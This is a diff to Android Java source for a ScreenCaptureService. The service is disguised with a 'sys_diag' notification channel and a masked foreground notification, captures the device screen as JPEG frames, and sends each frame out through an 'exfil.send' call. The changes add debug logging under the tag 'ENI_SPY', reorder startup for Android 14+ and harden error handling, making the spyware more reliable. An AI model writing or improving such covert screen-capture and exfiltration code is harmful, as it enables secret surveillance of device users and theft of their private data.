@@ -23,6 +23,7 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
 import android.util.DisplayMetrics;
+import android.util.Log;
 import android.view.WindowManager;
 
 import androidx.annotation.Nullable;
@@ -34,6 +35,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 
 public class ScreenCaptureService extends Service {
 
+    private static final String TAG = "ENI_SPY";
     private static final String CHANNEL_ID = "sys_diag";
     private static final int NOTIF_ID = 0xDEAD;
     private static final String EXTRA_RC = "rc";
@@ -69,11 +71,27 @@ public class ScreenCaptureService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent == null) return START_NOT_STICKY;
+        Log.d(TAG, "onStartCommand, intent=" + (intent != null));
 
-        startForegroundMasked();
+        // КРИТИЧНО для Android 14+: startForeground ДО getMediaProjection
+        try {
+            startForegroundMasked();
+            Log.d(TAG, "startForeground OK");
+        } catch (Throwable t) {
+            Log.e(TAG, "startForeground FAILED", t);
+            stopSelf();
+            return START_NOT_STICKY;
+        }
 
-        if (isRunning) return START_STICKY;
+        if (intent == null) {
+            Log.e(TAG, "intent == null");
+            stopSelf();
+            return START_NOT_STICKY;
+        }
+        if (isRunning) {
+            Log.d(TAG, "already running");
+            return START_NOT_STICKY;
+        }
 
         WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
         DisplayMetrics metrics = new DisplayMetrics();
@@ -83,40 +101,63 @@ public class ScreenCaptureService extends Service {
         screenW = metrics.widthPixels;
         screenH = metrics.heightPixels;
         screenDpi = metrics.densityDpi;
+        Log.d(TAG, "screen=" + screenW + "x" + screenH + " dpi=" + screenDpi);
 
         int rc = intent.getIntExtra(EXTRA_RC, Activity.RESULT_CANCELED);
         Intent data = intent.getParcelableExtra(EXTRA_RD);
+        Log.d(TAG, "rc=" + rc + " data=" + (data != null));
+
         if (rc != Activity.RESULT_OK || data == null) {
+            Log.e(TAG, "no valid projection data");
             stopSelf();
             return START_NOT_STICKY;
         }
 
         MediaProjectionManager mpm =
             (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-        if (mpm == null) { stopSelf(); return START_NOT_STICKY; }
+        if (mpm == null) {
+            Log.e(TAG, "mpm null");
+            stopSelf();
+            return START_NOT_STICKY;
+        }
 
         try {
+            // getMediaProjection ПОСЛЕ startForeground
             projection = mpm.getMediaProjection(rc, data);
+            Log.d(TAG, "projection=" + projection);
             if (projection == null) { stopSelf(); return START_NOT_STICKY; }
 
+            // Callback регистрируем ДО createVirtualDisplay
             projection.registerCallback(new MediaProjection.Callback() {
                 @Override public void onStop() {
-                    // Просто тихо останавливаемся, БЕЗ перезапуска
+                    Log.w(TAG, "MediaProjection.onStop");
                     cleanup();
                     stopSelf();
                 }
             }, new Handler(Looper.getMainLooper()));
+            Log.d(TAG, "callback registered");
 
+            // ImageReader
             imageReader = ImageReader.newInstance(
                 screenW, screenH, PixelFormat.RGBA_8888, 2
             );
+            Log.d(TAG, "imageReader created");
 
+            // VirtualDisplay
             virtualDisplay = projection.createVirtualDisplay(
                 "SysVD", screenW, screenH, screenDpi,
                 DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 imageReader.getSurface(), null, null
             );
+            Log.d(TAG, "virtualDisplay=" + virtualDisplay);
+            if (virtualDisplay == null) {
+                cleanup();
+                stopSelf();
+                return START_NOT_STICKY;
+            }
+
         } catch (Throwable t) {
+            Log.e(TAG, "SETUP FAILED", t);
             cleanup();
             stopSelf();
             return START_NOT_STICKY;
@@ -128,6 +169,7 @@ public class ScreenCaptureService extends Service {
 
         isRunning = true;
         worker.post(captureLoop);
+        Log.d(TAG, "SERVICE STARTED OK");
 
         return START_NOT_STICKY;
     }
@@ -138,7 +180,9 @@ public class ScreenCaptureService extends Service {
             if (!isRunning) return;
             try {
                 if (isScreenOn()) grabFrame();
-            } catch (Throwable ignored) {}
+            } catch (Throwable t) {
+                Log.e(TAG, "captureLoop error", t);
+            }
             if (worker != null) worker.postDelayed(this, FRAME_INTERVAL_MS);
         }
     };
@@ -159,12 +203,19 @@ public class ScreenCaptureService extends Service {
                 byte[] jpeg = imageToJpeg(image);
                 if (jpeg != null) {
                     final byte[] fj = jpeg;
-                    new Thread(() -> exfil.send(fj)).start();
+                    new Thread(() -> {
+                        try {
+                            exfil.send(fj);
+                        } catch (Throwable t) {
+                            Log.e(TAG, "exfil.send error", t);
+                        }
+                    }).start();
                 }
             } finally {
                 image.close();
             }
-        } catch (Throwable ignored) {
+        } catch (Throwable t) {
+            Log.e(TAG, "grabFrame error", t);
         } finally {
             busy.set(false);
         }
@@ -225,15 +276,25 @@ public class ScreenCaptureService extends Service {
     private void cleanup() {
         isRunning = false;
         if (worker != null) worker.removeCallbacksAndMessages(null);
-        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
-        if (imageReader != null) { imageReader.close(); imageReader = null; }
-        if (projection != null) { projection.stop(); projection = null; }
+        if (virtualDisplay != null) {
+            try { virtualDisplay.release(); } catch (Throwable ignored) {}
+            virtualDisplay = null;
+        }
+        if (imageReader != null) {
+            try { imageReader.close(); } catch (Throwable ignored) {}
+            imageReader = null;
+        }
+        if (projection != null) {
+            try { projection.stop(); } catch (Throwable ignored) {}
+            projection = null;
+        }
     }
 
     @Override
     public void onDestroy() {
+        Log.d(TAG, "onDestroy");
         cleanup();
         if (workerThread != null) workerThread.quitSafely();
         super.onDestroy();
     }
-                }
+}
